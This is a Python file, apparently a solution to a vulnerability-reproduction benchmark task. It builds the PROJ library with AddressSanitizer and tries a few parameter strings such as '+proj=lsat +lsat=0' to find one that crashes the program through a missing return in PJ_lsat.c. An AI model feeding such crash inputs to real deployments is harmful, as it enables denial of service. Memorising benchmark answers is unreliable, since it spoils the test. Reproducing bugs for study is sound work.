import os
import tarfile
import subprocess
import shutil
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a missing return statement in PJ_lsat.c in PROJ.
        This occurs when parameter 'lsat' or 'path' is <= 0.
        Default PoC: +proj=lsat +lsat=0
        """
        poc = b"+proj=lsat +lsat=0"
        
        tmp_dir = tempfile.mkdtemp()
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=tmp_dir)
            
            src_root = tmp_dir
            for root, dirs, files in os.walk(tmp_dir):
                if "configure" in files or "autogen.sh" in files:
                    src_root = root
                    break
            
            # Setup environment for compilation with ASAN
            env = os.environ.copy()
            env["CFLAGS"] = "-g -O1 -fsanitize=address"
            env["LDFLAGS"] = "-fsanitize=address"
            
            # Build
            # 1. Autogen
            if not os.path.exists(os.path.join(src_root, "configure")):
                autogen = os.path.join(src_root, "autogen.sh")
                if os.path.exists(autogen):
                    subprocess.run(["sh", "autogen.sh"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 2. Configure
            if os.path.exists(os.path.join(src_root, "configure")):
                subprocess.run(
                    ["./configure", "--disable-shared", "--disable-static", "--without-jni", "--without-mutex"],
                    cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                
                # 3. Make
                subprocess.run(["make", "-j8"], cwd=src_root, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # 4. Find binary
                proj_bin = None
                potential_bins = [
                    os.path.join(src_root, "src", "proj"),
                    os.path.join(src_root, "src", ".libs", "proj"),
                    os.path.join(src_root, "programs", "proj"),
                    os.path.join(src_root, "programs", ".libs", "proj")
                ]
                for p in potential_bins:
                    if os.path.exists(p):
                        proj_bin = p
                        break
                
                # 5. Fuzz/Verify
                if proj_bin:
                    candidates = [
                        b"+proj=lsat +lsat=0",
                        b"+proj=lsat +lsat=-1",
                        b"+proj=lsat +lsat=0 +path=1",
                        b"+proj=lsat +lsat=1 +path=0",
                        b"+proj=lsat +lsat=1 +path=-1"
                    ]
                    
                    for cand in candidates:
                        try:
                            args = cand.decode().split()
                            cmd = [proj_bin] + args
                            # PROJ expects coordinate input on stdin, provide dummy
                            result = subprocess.run(
                                cmd, 
                                input=b"0 0\n", 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.PIPE,
                                timeout=2
                            )
                            
                            # Check for crash (ASAN returns non-zero, usually 1 or -11)
                            if result.returncode != 0:
                                poc = cand
                                break
                        except Exception:
                            continue

        except Exception:
            pass
        finally:
            shutil.rmtree(tmp_dir)
            
        return poc